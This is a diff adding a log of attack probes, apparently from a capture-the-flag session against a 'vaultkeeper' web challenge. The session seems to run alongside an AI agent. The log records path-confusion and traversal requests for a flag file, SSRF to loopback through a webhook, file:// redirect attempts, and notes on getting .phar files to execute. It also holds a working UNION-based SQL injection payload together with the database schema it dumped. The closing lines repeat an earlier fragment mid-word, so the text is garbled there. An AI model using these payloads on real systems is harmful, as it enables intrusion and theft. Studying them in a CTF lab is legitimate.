@@ -1,0 +1,54 @@
+[*] waiting for $HOME/ctf-tools/VK-BASE.txt (driver agent writes it)...
+[*] base  https://vaultkeeper-67183f6b97e7ba57.challs.ctf.thefewchosen.com
+[*] redir https://jan-pharmaceuticals-object-representatives.trycloudflare.com
+
+[A] Apache %3F confusion aimed at /flag.txt (handout gives php-fpm '403 Access denied.')
+  /flag.txt%3Fa.php                                403 Access denied.
+  /api/%2e%2e/flag.txt%3Fa.php                     403 Access denied.
+  /api/%2e%2e/%2e%2e/flag.txt%3Fa.php              403 Access denied.
+  /private/cap.mask                                404 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The request
+  /flag.txt                                        404 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The request
+  /api/%2e%2e/private/cap.mask%3Fa.php             404 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The request
+   read: '403 Access denied.' = limit_extensions active, docroot confined -> CLOSED
+         Apache 400 HTML       = URI escapes the root -> CLOSED
+         anything else         = the deployed vhost differs, DIG IN
+
+[B] /api/diag.php schemas. handout: vaultkeeper=[jobs,schedules] vk_restore=[catalog]. ANY extra table is the deployed unseal state.
+  schemas: {"vaultkeeper":["jobs"],"vk_restore":["catalog"]}
+  runtime: {"php":"8.2.12","sapi":"fpm-fcgi","os":"Linux 6.12.94+","extensions":["pdo_mysql","openssl","json","mbstring","zlib"],"timezone":"UTC","max_upload":"2M","mem_limit":"128M"}
+
+[C] /api/replica.php manifest: vk_restore tables with row counts
+  replica.php                                      200 { "node": "node-a", "manifest": { "catalog": 4 } }
+
+[D] webhook_test POST SSRF to loopback (status + LENGTH oracle)
+  127.0.0.2 /api/status.php  (bypass works?)       307 Temporary Redirect
+  127.0.0.1 /api/status.php  (control, must refuse) 307 Temporary Redirect
+  POST 127.0.0.2 /api/keyring.php                  307 Temporary Redirect
+  POST 127.0.0.2 /api/vault_unseal.php             307 Temporary Redirect
+  POST 127.0.0.2 /api/vault_unseal.php?ref=        307 Temporary Redirect
+   read: a vault_unseal POST whose status/bytes differ from its GET means
+         the deployed handshake has a POST branch nobody has reached.
+
+[E] fetch_source Location with a non-http scheme, on the DEPLOYED build
+  file:///flag.txt                                   0 ERR TimeoutError('timed out')
+  file:///var/www/private/cap.mask                   0 ERR URLError(TimeoutError('timed out'))
+   read: chain [418,418,418,...] = relative-path loop back to us -> CLOSED
+
+[F] php-fpm security.limit_extensions remotely (.phar IS allowed)
+  /samples/demo-nightly.vkb%3Fa.php                  0 ERR URLError(TimeoutError('timed out'))
+  /assets/style.css%3Fa.php                        403 Access denied.
+   read: '403 Access denied.' = limit_extensions active. Remember .phar
+         executes, so any future docroot write only needs a .phar name.
+
+[G] query.php SQLi re-audit as vk_restore (UDF / FILE / visible schemas)
+  user/version/secure_file_priv/plugin_dir           0 ERR URLError(TimeoutError('timed out'))
+  every table vk_restore can see                   200 { "filter": "1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(DISTINCT CONCAT(table_schema,'.',table_name)) FROM information_schema.tables),3,4-- ", "ok": true, "count": 1, "results": [ { "id": 1, "name": "information_schema.ALL_PLUGINS,information_schema.APPLICABLE_ROLES,information_schema.CHARACTER_SETS,information_schema.CHECK_CONSTRAINTS,information_schema.CLIENT_STATISTICS,information_schema.COLLATIONS,information_schema.COLLATION_CHARACTER_SET_APPLICABILITY,information_schema.COLUMNS,information_schema.COLUMN_PRIVILEGES,information_schema.ENABLED_ROLES,information_schema.ENGINES,information_schema.EVENTS,information_schema.FILES,information_schema.GEOMETRY_COLUMNS,information_schema.GLOBAL_STAT
+   read: a vaultkeeper.* table visible here means the deployed grants are
+         wider than the handout's and the jobs table is directly writable.
+
+[*] 19 requests total
+ion_schema.COLLATION_CHARACTER_SET_APPLICABILITY,information_schema.COLUMNS,information_schema.COLUMN_PRIVILEGES,information_schema.ENABLED_ROLES,information_schema.ENGINES,information_schema.EVENTS,information_schema.FILES,information_schema.GEOMETRY_COLUMNS,information_schema.GLOBAL_STAT
+   read: a vaultkeeper.* table visible here means the deployed grants are
+         wider than the handout's and the jobs table is directly writable.
+
+[*] 19 requests total
